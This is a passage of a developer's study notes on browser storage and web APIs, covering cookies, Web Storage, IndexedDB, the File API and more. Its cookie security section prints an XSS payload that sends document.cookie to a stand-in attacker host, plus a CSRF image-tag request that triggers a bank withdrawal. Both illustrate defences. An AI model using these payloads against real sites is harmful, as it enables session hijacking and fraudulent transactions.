extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">sKey</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sKey<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">&quot;(?:(?:^|.*;)\\s*&quot;</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>sKey<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\-\.\+\*]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&quot;\\$&amp;&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;\\s*\\=\\s*([^;]*).*$)|^.*$&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;$1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li>remove — set <code>Expires</code> to past (<code>Thu, 01 Jan 1970 00:00:00 GMT</code>) or set <code>Max-Age</code> to non-positive<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">sKey<span class="token punctuation">,</span> sPath<span class="token punctuation">,</span> sDomain</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasItem</span><span class="token punctuation">(</span>sKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>sKey<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sDomain <span class="token operator">?</span> <span class="token string">&quot;; domain=&quot;</span> <span class="token operator">+</span> sDomain <span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sPath <span class="token operator">?</span> <span class="token string">&quot;; path=&quot;</span> <span class="token operator">+</span> sPath <span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li></ol> <h5 id="cookie-security"><a href="#cookie-security" class="header-anchor">#</a> cookie security</h5> <ol><li><p>Session hijacking and XSS</p> <ul><li>Cookies are often used in web application to identify a user and their authenticated session</li> <li>stealing a cookie can lead to hijacking the authenticated user's session</li> <li>The <code>HttpOnly</code> cookie attribute can help to mitigate this attack</li> <li>exploiting an XSS vulnerability in the application<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</code></pre></div></li></ul></li> <li><p>Tracking and privacy</p> <ul><li>third-party cookies are mainly used for advertising and tracking across the web</li> <li>Do-Not-Track: <code>DNT</code> request header, but not effective</li> <li>persistent cookie: <a href="https://github.com/samyk/evercookie" target="_blank" rel="noopener noreferrer">evercookie<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>space and number restrictions on cookies???</li></ul></li> <li><p>Cross-site request forgery (CSRF)</p> <ul><li>prevent
<ul><li>As with XSS, input filtering is important</li> <li>There should always be a confirmation required for any sensitive action</li> <li>Cookies that are used for sensitive actions should have a short lifetime only</li> <li>For more prevention tips, see the <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener noreferrer">OWASP CSRF prevention cheat sheet<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>Requiring a computed token to be sent along with every request and requiring SSL to access resources that can be requested via XHR</li></ul></li> <li>for example, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money. Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li>the following are ineffective against CSRF attacks
<ul><li>Requiring a POST instead of a GET — This is easily changed</li> <li>Using the referrer as a determination of origin — Referrers are easily spoofed</li> <li>Validating based on cookie information — Also easily spoofed</li> <li>use <code>XMLHttpRequest.open()</code> with username and password</li></ul></li></ul></li></ol> <h4 id="internet-explorer-user-data"><a href="#internet-explorer-user-data" class="header-anchor">#</a> Internet Explorer User Data</h4> <h4 id="web-storage"><a href="#web-storage" class="header-anchor">#</a> Web Storage</h4> <ol><li><p>Web Storage concepts and usage</p> <ul><li>provides mechanisms by which browsers can store key/value pairs</li> <li>in a much more intuitive fashion than using cookies</li> <li>The keys and the values are always strings (note that integer keys will be automatically converted to strings, just like what objects do)</li> <li><code>Window.sessionStorage: Storage</code> — maintains a separate storage area for each given origin that's available for the duration of the page session (the browser is not closed, including page reloads and restores)
<ul><li>Opening a page in a new tab or window will cause a new session to be initiated with the value of the top-level browsing context, which differs from how session cookies work</li></ul></li> <li><code>Window.localStorage: Storage</code> — does the same thing, but persists even when the browser is closed and reopened</li> <li>availability
<ul><li>IE8+</li> <li>Safari, which in Private Browsing mode gives us an empty localStorage object with a quota of zero, effectively making it unusable</li> <li><code>Window.sessionStorage</code> not available on <code>file:</code> or <code>data:</code></li> <li>In order to access the same <code>localStorage</code> object: the same origin policy</li></ul></li></ul></li> <li><p><code>Storage</code></p> <ul><li>properties
<ul><li><code>Storage.length</code> Read only — Returns an integer representing the number of data items stored in the <code>Storage</code> object</li></ul></li> <li>methods — keys and values are always strings
<ul><li><code>Storage.key(index: number): string</code> — When passed a number n, this method will return the name of the nth key in the storage</li> <li><code>Storage.getItem(key)</code> — When passed a key name, will return that key's value</li> <li><code>Storage.setItem(key, value)</code> — When passed a key name and value, will add that key to the storage, or update that key's value if it already exists
<ul><li>may throw an exception if the storage is full</li></ul></li> <li><code>Storage.removeItem(key)</code> — When passed a key name, will remove that key from the storage, do nothing when no such key
<ul><li><code>delete</code> with object notation</li></ul></li> <li><code>Storage.clear(): void</code> — When invoked, will empty all keys out of the storage</li> <li>plain object key value notation — automatically invokes <code>Storage.getItem()</code> and <code>Storage.setItem()</code> <ul><li><code>.</code> or bracket notation</li> <li>not recommended</li></ul></li></ul></li></ul></li> <li><p><code>StorageEvent</code></p> <ul><li>inherits: <code>Event</code> as all other events</li> <li>event type: <code>storage</code> — fired when a storage area has been modified
<ul><li>target: DefaultView (<code>window</code>)</li> <li>does not bubble, not cancelable, no default action</li></ul></li> <li>constructor: <code>StorageEvent('storage')</code></li> <li>properties: read only
<ul><li><code>StorageEvent.key</code></li> <li><code>StorageEvent.oldValue</code></li> <li><code>StorageEvent.newValue</code></li> <li><code>StorageEvent.url</code> — The address of the document whose key changed</li> <li><code>StorageEvent.storageArea</code> — The Storage object that was affected</li></ul></li></ul></li></ol> <h4 id="indexeddb"><a href="#indexeddb" class="header-anchor">#</a> IndexedDB</h4> <ol><li><p>Key concepts and usage</p> <ul><li>for client-side storage of significant amounts of structured data, including files/blobs</li> <li>a transactional database system, like an SQL-based RDBMS, but a JavaScript-based object-oriented database</li> <li>store and retrieve objects that are indexed with a key
<ul><li>uses indexes to enable high-performance searches</li> <li>any objects supported by the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener noreferrer">structured clone algorithm<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> can be stored</li></ul></li> <li>follows a same-origin policy</li> <li>asynchronous</li> <li>You need to specify the database schema, open a connection to your database, and then retrieve and update data within a series of auto-committed transactions</li> <li>event driven</li></ul></li> <li><p>to be continued tbc</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener noreferrer">IndexedDB API<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB" target="_blank" rel="noopener noreferrer">Using IndexedDB<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Basic_Concepts_Behind_IndexedDB" target="_blank" rel="noopener noreferrer">Basic concepts<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage#Storing_complex_data_%E2%80%94_IndexedDB" target="_blank" rel="noopener noreferrer">Tutorial<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Browser_storage_limits_and_eviction_criteria" target="_blank" rel="noopener noreferrer">Browser storage limits and eviction criteria<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>P786</li></ul></li></ol> <h2 id="apis"><a href="#apis" class="header-anchor">#</a> APIs</h2> <h3 id="file-api"><a href="#file-api" class="header-anchor">#</a> File API</h3> <ol><li><p><code>Blob</code></p> <ul><li>represents a file-like object of immutable, raw data</li> <li>constructor: <code>Blob(blobParts?: BlobPart[], options?: BlobPropertyBag)</code> <ul><li><code>BlobPart[]</code> — an <code>Array</code> of <code>ArrayBuffer</code>, <code>ArrayBufferView</code>, <code>Blob</code>, <code>DOMString</code> objects, or a mix of any of such objects, that will be put inside the <code>Blob</code>. <code>DOMStrings</code> are encoded as UTF-8</li> <li><code>BlobPropertyBag.type</code> — the MIME type of the content of the array that will be put in the blob, defaults to <code>''</code></li></ul></li> <li>properties
<ul><li><code>Blob.size</code> Read only — The size, in bytes, of the data contained in the <code>Blob</code> object</li> <li><code>Blob.type</code> Read only — A string indicating the MIME type of the data contained in the <code>Blob</code>. If the type is unknown, this string is empty</li></ul></li> <li><code>Blob.slice(start?: number, end?: number, contentType?: string): Blob</code> — create a new <code>Blob</code> object containing the data in the specified range of bytes of the source
<ul><li><code>start</code>, <code>end</code> — in bytes, Pythonic</li> <li><code>contentType</code> — defaults to <code>''</code></li></ul></li></ul></li> <li><p><code>File</code></p> <ul><li>inherits <code>Blob</code></li> <li>source: <code>HTMLInputElement.files</code>, <code>DataTransfer.files</code>, etc.</li> <li>constructor: <code>File(fileBits: BlobPart[], fileName: string, options?: FilePropertyBag)</code> <ul><li><code>FilePropertyBag.type</code> — <code>BlobPropertyBag.type</code></li> <li><code>FilePropertyBag.lastModified</code> — A number representing the number of milliseconds between the Unix time epoch and when the file was last modified. Defaults to a value of <code>Date.now()</code></li></ul></li> <li>properties, Read only — <code>File.lastModified</code>, <code>File.name</code>, <code>File.size</code>, <code>File.type</code></li></ul></li> <li><p><code>FileReader</code></p> <ul><li>lets web applications asynchronously read the contents of files (or raw data buffers) stored on the user's computer
<ul><li>can think of it as similar to <code>XMLHttpRequest</code></li></ul></li> <li>usage: initialize, attach event handlers, call read method</li> <li>constructor: <code>FileReader()</code></li> <li>properties
<ul><li><code>FileReader.error</code> Read only — A <code>DOMException</code> representing the error that occurred while reading the file</li> <li><code>FileReader.readyState</code> Read only
<ul><li><code>FileReader.EMPTY</code> 0 — No data has been loaded yet</li> <li><code>FileReader.LOADING</code> 1 — Data is currently being loaded</li> <li><code>FileReader.DONE</code> 2 — The entire read request has been completed</li></ul></li> <li><code>FileReader.result</code> Read only — The file's contents. This property is only valid after the read operation is complete, and the format of the data depends on which of the methods was used to initiate the read operation</li></ul></li> <li>Event handlers
<ul><li><code>FileReader.onabort</code></li> <li><code>FileReader.onerror</code></li> <li><code>FileReader.onload</code></li> <li><code>FileReader.onloadstart</code></li> <li><code>FileReader.onloadend</code></li> <li><code>FileReader.onprogress</code></li></ul></li> <li>methods — reads both <code>Blob</code> and <code>File</code> <ul><li><code>FileReader.abort(): void</code> — Aborts the read operation. Upon return, the readyState will be <code>DONE</code></li> <li><code>FileReader.readAsArrayBuffer(blob): void</code> — Starts reading, once finished, the <code>result</code> attribute contains an <code>ArrayBuffer</code> representing the file's data</li> <li><code>FileReader.readAsBinaryString(blob): void</code> — Starts reading, once finished, the <code>result</code> attribute contains the raw binary data from the file as a <code>string</code> <ul><li>not recommended, use <code>FileReader.readAsArrayBuffer()</code> instead</li></ul></li> <li><code>FileReader.readAsDataURL(blob): void</code> — Starts reading, once finished, the <code>result</code> attribute contains a <code>data: URL</code> representing the file's data
<ul><li>also static method <code>URL.createObjectURL(object: File|Blob|MediaSource): string</code></li> <li><code>URL.revokeObjectURL(objectURL: string): void</code> — let the browser know not to keep the reference to the file any longer</li></ul></li> <li><code>FileReader.readAsText(blob, encoding?): void</code> — Starts reading, once finished, the <code>result</code> attribute contains the contents of the file as a text string</li></ul></li></ul></li></ol> <h3 id="fullscreen-api"><a href="#fullscreen-api" class="header-anchor">#</a> Fullscreen API</h3> <ol><li><p><code>Element.requestFullscreen(): Promise&lt;void&gt;</code> — issues an asynchronous request to make the element be displayed full-screen</p> <ul><li>This method must be invoked from a user interaction or a device orientation change, else it will fail
<ul><li>not for <code>&lt;object&gt;</code>, <code>&lt;frame&gt;</code>, or <code>&lt;iframe&gt;</code> without <code>allowfullscreen</code> attribute</li></ul></li> <li>when success — resolve and the document will receive a <code>fullscreenchange</code> event</li> <li>If permission is denied, the promise is rejected and the document receives a <code>fullscreenerror</code> event</li></ul></li> <li><p><code>Document.exitFullscreen(): Promise&lt;void&gt;</code></p> <ul><li>A &quot;stack&quot; of full-screen elements is maintained by the browser
<ul><li>If another element was previously in full-screen mode when the current element was placed into full-screen mode, that previous element regains full-screen mode</li></ul></li></ul></li> <li><p><code>Document.fullscreenEnabled: boolean</code></p></li> <li><p><code>DocumentOrShadowRoot.fullscreenElement: Element</code> — <code>Element</code> currently being presented in full-screen mode in this document, or <code>null</code> if full-screen mode is not currently in use</p></li> <li><p>Events</p> <ul><li><code>fullscreenchange</code>, <code>fullscreenerror</code></li> <li>interface: <code>Event</code></li> <li>Bubbles — Yes</li> <li>Cancelable — No</li> <li>Target — Document</li> <li>Default Action — None</li></ul></li></ol> <h3 id="performance"><a href="#performance" class="header-anchor">#</a> Performance</h3> <ol><li><code>WindowOrWorkerGlobalScope.performance: Performance</code> <ul><li>provides access to performance-related information for the current page</li> <li>methods
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>Performance.now()</code> — more precise than <code>Date.now()</code></li></ul></li></ul></li></ol> <h3 id="web-worker"><a href="#web-worker" class="header-anchor">#</a> Web Worker</h3> <ol><li><p><code>Worker</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>Worker API</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="url"><a href="#url" class="header-anchor">#</a> URL</h3> <ol><li><p><code>URL</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/URL" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p><code>URLSearchParams</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/URL" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>see node notes</p></li></ol> <h3 id="payment-request-api"><a href="#payment-request-api" class="header-anchor">#</a> Payment Request API</h3> <ol><li>Payment Request API
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Payment_Request_API" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/tangentyh/notes-of-tan/edit/master/docs/BOM_DOM_notes.md" target="_blank" rel="noopener noreferrer">Edit This Page On GitHub</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">1/3/2024, 9:50:43 AM</span></div></footer> <!----> </main></div><div class="global-ui"><!----></div></div>
    <script src="/notes-of-tan/assets/js/app.f4f0a8b0.js" defer></script><script src="/notes-of-tan/assets/js/2.56609c80.js" defer></script><script src="/notes-of-tan/assets/js/3.565b7101.js" defer></script>
  </body>
</html>
